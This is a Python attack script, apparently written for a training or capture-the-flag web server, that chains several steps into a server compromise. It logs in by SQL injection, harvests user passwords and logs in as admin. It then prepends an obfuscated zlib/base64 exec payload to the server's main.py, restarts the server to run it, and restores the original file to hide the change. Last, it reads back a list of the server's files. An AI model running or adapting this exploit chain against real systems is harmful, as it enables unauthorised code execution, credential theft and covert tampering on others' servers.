"""
Code inject - Add code that puts the list of files in the server on /tmp/files_list so we can later read the files list.
Use the get file API to then grab the result, and then revert the code to remove our modifications
"""
import time
import zlib
from base64 import b64decode

from login_crack import login_with_password, login_sql_inject
from db_crack import get_users
import requests

# The output from pyminify:
# Command to get this: pyminifier --obfuscate --gzip  list_files_work.py
code_minified = """import zlib, base64
exec(zlib.decompress(base64.b64decode('eJw9jsHOwiAQhO/7FBsvQNLQizF/THgMT8YDWEj5LbACWmN8eEs1nnYy821mfKCUK6YCTiWyEaJKRZKuI4xNzXq6gP9Az8kbuKt25DkFyrYsbzkFNLrY3Ra/nNltbTynwcJVsb4G6p2fbGEwWIeBiz1gVccToEsZD125mcHn0q0Q+ogjZz1r1ApQs9asOVilpmXnwKP8Tz7yQ0dCAD7Ur5Xf+eb12nziKuTXZbfq/pho8OzriI5fOzYbJnRBR2sbyTn7avlDwDIT3ne3WiY=')))
"""

def get_file_from_server(filename, base_admin_url):
    """
    Get a file from the server
    :param filename: A file name, including the full path
    :param base_admin_url: The base_url after an admin login
    """
    get_file_url = f'{base_admin_url}/view'
    data = {'src': filename}
    resp = requests.post(get_file_url, data=data)
    file_data = resp.content.decode('utf8')
    return file_data, resp.status_code

def inject_and_run_code(py_filename, base_admin_url):
    """
    Add code to the python file in py_filename. Meant to add to our main.py:
    :param py_filename: The name of the file we want to inject the code to
    :param file_contents: The original contents of the file we are injecting to
    """
    # First read the original file from the server:
    file_contents, _ = get_file_from_server(py_filename, base_admin_url)

    # Now add our "attack" code to it and write the updated file to the server:
    upload_endpoint = f'{base_admin_url}/upload_file'
    new_file_contents = code_minified + file_contents
    resp = requests.post(upload_endpoint, data={'file_name': py_filename, 'payload': new_file_contents})
    assert resp.status_code == 200, Exception(f"Error writing {py_filename}")
    # Validate that the code we wrote did reach the server correctly:
    new_file_read, _ = get_file_from_server(py_filename, base_admin_url)
    assert new_file_read == new_file_contents, Exception("Read file from server mismatched the code we sent!")
    print("Injected our code and validated it")

    # Now restart the server so it will run our code:
    restart_server(base_admin_url)
    print("Restarted the server to run the code")

    # Wait a few, then re-write the original code so we hide our changes:
    time.sleep(5)
    resp = requests.post(upload_endpoint, data={'file_name': py_filename, 'payload': file_contents})
    assert resp.status_code == 200, Exception(f"Error writing {py_filename}")
    restart_server(base_admin_url)
    time.sleep(1)
    print("Cleared the code back to the original")

    # Lastly, read the file we put on the server from our new code:
    response, status_code = get_file_from_server('/tmp/files', base_admin_url)
    if status_code==200:
        # Success!
        files_list = zlib.decompress(b64decode(response)).decode('utf8').split('||')
        print("Got file_list from server:")
        print(files_list[:1000])
        return files_list
    else:
        # Failed :-(
        print(f"Failed to read file. Status={status_code}")
        print(response)


def restart_server(base_admin_url):
    restart_endpoint = f'{base_admin_url}/restart'
    try:
        # This will fail since the server will restart during handling of the call. So just restart it
        resp = requests.post(restart_endpoint)
    except:
        pass


def main(server_url, res_file='/tmp/files_list', admin_password=None):
    """
    Run the process:
    1. Login with SQL inject as 'david'
    2. Get the list of users and passwords
    3. Find the admin password
    4. Login as admin with regular user/password
    5. Inject our code, run it, read the result
    """
    if admin_password is None:
        # Need to get the admin password first:
        url = login_sql_inject('david', server_url)
        user_base_url = url.rsplit('/',1)[0]
        users_list = get_users(user_base_url)
        # Find the 'admin' user:
        admin = [u for u in users_list if u['name']=='admin']
        assert len(admin)==1, Exception("Could not find exactly one admin")
        admin = admin[0]
        admin_password = admin['password']
        print(f"Got the admin password: {admin_password}")

    # Now login as admin:
    admin_login = login_with_password('admin', admin_password, server_url)
    admin_base_url = admin_login.rsplit('/', 1)[0]
    print("Logged in as admin!")

    # Now inject the code:
    files_list = inject_and_run_code('main.py', admin_base_url)

    # Write the result to a file:
    if files_list:
        with open(res_file, 'w') as fp:
            fp.write("\n".join(files_list))

if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--server_url", default="http://localhost:8080", help="Server base URL")
    parser.add_argument("-p", "--password", default=None, help="Admin password (if known)")
    parser.add_argument("-o", "--outfile", default='/tmp/files_list', help="Output file name - for list of server files")
    args = parser.parse_args()

    main(args.server_url, args.outfile, args.password)



